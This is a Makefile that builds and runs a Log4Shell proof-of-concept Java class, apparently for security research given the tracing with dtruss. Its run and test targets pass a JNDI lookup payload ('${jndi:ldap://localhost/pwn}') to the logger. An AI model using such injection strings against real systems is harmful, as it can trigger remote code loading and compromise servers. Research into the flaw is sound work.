JARFILE=log4shell-poc.jar
MANIFEST=classes/META-INF/MANIFEST.MF
EMPTY :=
SPACE := $(EMPTY) $(EMPTY)
LIBS=lib/log4j-api-2.17.0.jar lib/log4j-core-2.17.0.jar
CLASSPATH=$(subst $(SPACE),:,$(LIBS))

.PHONY: run
run: $(JARFILE)
	java -cp $(JARFILE):$(CLASSPATH) com.trailofbits.log4shell.PoC "About to pwn" "$${jndi:ldap://localhost/pwn}"

.PHONY: test
test: $(JARFILE)
	dtruss java -cp $(JARFILE):$(CLASSPATH) com.trailofbits.log4shell.PoC "About to pwn" "$${jndi:ldap://localhost/pwn}"

$(JARFILE): classes/com/trailofbits/log4shell/PoC.class $(LIBS)
	# cd classes && jar -xf ../lib/log4j-api-2.17.0.jar && rm -rf META-INF
	# cd classes && jar -xf ../lib/log4j-core-2.17.0.jar && rm -rf META-INF
	@echo "Manifest-Version: 1.0" > .manifest.tmp
	@echo "Main-Class: com.trailofbits.log4shell.PoC" >> .manifest.tmp
	@echo "Class-Path: $(LIBS)"
	jar cmf .manifest.tmp $@ -C classes com
#-C classes org classes/Log4j-*
	@rm -f .manifest.tmp

$(MANIFEST):
	mkdir -p $(dir $(MANIFEST))

classes/%.class: java/%.java $(LIBS)
	javac -d classes -cp $(CLASSPATH) --source-path java $<

.PHONY: clean
clean:
	rm -rf classes $(JARFILE)
